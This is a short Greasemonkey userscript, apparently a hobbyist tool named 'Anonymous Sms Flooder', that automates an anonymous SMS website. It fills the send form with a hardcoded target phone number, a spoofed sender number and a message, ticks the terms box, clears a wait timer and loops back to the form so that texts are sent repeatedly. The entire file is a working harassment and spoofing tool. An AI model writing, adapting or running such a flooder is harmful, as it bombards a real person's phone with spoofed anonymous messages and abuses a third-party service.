// ==UserScript==
// @name           Anonymous Sms Flooder by D3
// @namespace      OUG
// @description    Anonymous SMS Flooder by D3
// @include       http://*phreakyphonez.net/sms/index.asp
// @include       http://*phreakyphonez.net/sms/send.asp
// @include       http://*phreakyphonez.net/sms/
// @version       0.1.4
// ==/UserScript==


//currently site is down... still i am sure it will work :P
// al done :P :)

if(document.location=="http://www.phreakyphonez.net/sms/send.asp" || document.location=="http://phreakyphonez.net/sms/send.asp")
{
	document.location="http://www.phreakyphonez.net/sms/index.asp";
}
else
{
	var target="7763127653";
	var sender="917763123456";
	var sms="Hello Freaking World!!!";
	var countrycode="91";

	document.forms[1].elements[0].value=countrycode;
	document.forms[1].elements[1].value=countrycode;
	document.forms[1].elements[2].value=target;
	document.forms[1].elements[3].value=sender;
	document.forms[1].elements[5].value=sms;
	document.forms[1].elements[8].checked=true; //accepting terms
	//document.location="javascript:document.getElementById(element_id).innerHTML = link_text;void(0);";
	document.location="javascript:time=0;void(0);";
	document.forms[1].elements[7].focus();
}